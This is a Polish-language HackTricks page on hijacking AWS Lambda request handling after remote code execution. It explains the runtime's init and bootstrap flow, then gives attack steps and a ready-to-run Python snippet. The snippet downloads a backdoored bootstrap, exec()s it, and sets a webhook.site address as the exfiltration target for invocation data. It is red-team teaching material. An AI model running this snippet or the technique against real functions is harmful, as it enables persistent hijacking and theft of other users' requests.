# AWS - Ukradnij żądania Lambda

<details>

<summary><strong>Zacznij od zera i stań się ekspertem od hakowania AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) albo **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Przepływ Lambda

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** to proces poza kontenerem, który **wysyła wywołania** do procesu **init**.
2. Proces init nasłuchuje na porcie **9001**, ujawniając kilka interesujących punktów końcowych:
* **`/2018-06-01/runtime/invocation/next`** – pobierz następne zdarzenie wywołania
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** – zwróć odpowiedź obsługiwarza dla wywołania
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** – zwróć błąd wykonania
3. **bootstrap.py** ma pętlę pobierającą wywołania od procesu init i wywołuje kod użytkownika do ich obsługi (**`/next`**).
4. W końcu **bootstrap.py** wysyła do init **odpowiedź**.

Należy zauważyć, że bootstrap ładuje kod użytkownika jako moduł, więc wszelkie wykonania kodu wykonywane przez kod użytkownika faktycznie mają miejsce w tym procesie.

## Kradzież żądań Lambda

Celem tego ataku jest spowodowanie wykonania przez kod użytkownika złośliwego procesu **`bootstrap.py`** wewnątrz procesu **`bootstrap.py`**, który obsługuje podatne żądanie. W ten sposób **złośliwy proces bootstrap** rozpocznie **komunikację z procesem init** w celu obsługi żądań, podczas gdy **uczciwy** bootstrap jest **uwięziony** uruchamiając złośliwy, więc nie będzie prosił o żądania do procesu init.&#x20;

Jest to proste zadanie do osiągnięcia, ponieważ kod użytkownika jest wykonywany przez uczciwy proces **`bootstrap.py`**. W związku z tym atakujący mógłby:

* **Wysłać fałszywy wynik bieżącego wywołania do procesu init**, aby init myślał, że proces bootstrap czeka na więcej wywołań.
* Należy wysłać żądanie do **`/${invoke-id}/response`**&#x20;
* Identyfikator wywołania można uzyskać z stosu uczciwego procesu **`bootstrap.py`** za pomocą modułu pythona [**inspect**](https://docs.python.org/3/library/inspect.html) (jak [zaproponowano tutaj](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) lub po prostu ponownie żądając go do **`/2018-06-01/runtime/invocation/next`** (jak [zaproponowano tutaj](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* Wykonaj złośliwy **`boostrap.py`**, który będzie obsługiwał kolejne wywołania
* W celu zachowania dyskrecji można przesłać parametry wywołań lambda do kontrolowanego przez atakującego C2, a następnie obsługiwać żądania jak zwykle.
* Dla tego ataku wystarczy uzyskać oryginalny kod **`bootstrap.py`** z systemu lub [**githuba**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py), dodać złośliwy kod i uruchomić go z bieżącego wywołania lambdy.

### Kroki ataku

1. Znajdź podatność na **RCE**.
2. Wygeneruj **złośliwy** **bootstrap** (np. [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **Wykonaj** złośliwy bootstrap.

Możesz łatwo wykonać te czynności, uruchamiając:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Dla dalszych informacji sprawdź [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## Referencje

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)
